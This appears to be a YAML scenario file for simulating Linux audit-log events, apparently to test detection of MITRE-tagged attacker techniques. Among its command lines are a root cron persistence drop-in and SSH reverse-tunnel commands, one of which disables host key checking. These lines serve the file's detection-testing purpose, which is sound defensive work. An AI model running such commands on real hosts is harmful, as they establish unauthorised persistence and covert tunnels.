scenarios:
  - id: cron_persistence_interactive_shell
    name: Cron persistence from an interactive shell
    description: >
      An authenticated user writes a cron drop-in from an interactive Bash
      session to establish recurring execution.
    technique_id: T1053.003
    platform: linux
    log_source: linux_audit
    count: 1
    host: linux-workstation-01
    user: attacker
    user_id: 1000
    audit_user_id: 1000
    terminal: pts0
    exe: /usr/bin/bash
    parent_comm: bash
    command_line: >-
      bash -c 'echo "*/5 * * * * root /tmp/update.sh"
      > /etc/cron.d/system-update'


  - id: benign_crontab_listing
    name: Benign Cron listing from an interactive shell
    description: An authenticated user lists crons.
    technique_id: null
    platform: linux
    log_source: linux_audit
    count: 1
    host: linux-workstation-01
    user: user_01
    user_id: 1000
    audit_user_id: 1000
    terminal: pts0
    exe: /usr/bin/bash
    parent_comm: bash
    command_line: crontab -l
  
  - id: ssh_remote_tunneling
    name: Tunneling via SSH remote forward
    description: >
      An authenticated user launches SSH remote port forwarding (-R) from an
      interactive shell to expose a remote service through the compromised host.
    technique_id: T1572
    platform: linux
    log_source: linux_audit
    count: 1
    host: web-prod-01
    user: deploy
    user_id: 1001
    audit_user_id: 1001
    terminal: pts0
    exe: /usr/bin/ssh
    parent_comm: bash
    command_line: ssh -R 4444:203.0.113.99:2222 user@example.com

  - id: ssh_remote_forward
    name: SSH remote port forwarding
    description: >
      Attacker establishes a reverse tunnel (-R) through a compromised host to
      expose an internal service or maintain C2 after interactive shell access.
    technique_id: T1572
    platform: linux
    log_source: linux_audit
    count: 1
    host: web-prod-01
    user: deploy
    user_id: 1001
    audit_user_id: 1001
    terminal: pts0
    exe: /usr/bin/ssh
    parent_comm: bash
    command_line: >-
      ssh -N -f -R 8443:127.0.0.1:443 user@203.0.113.200
      -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null

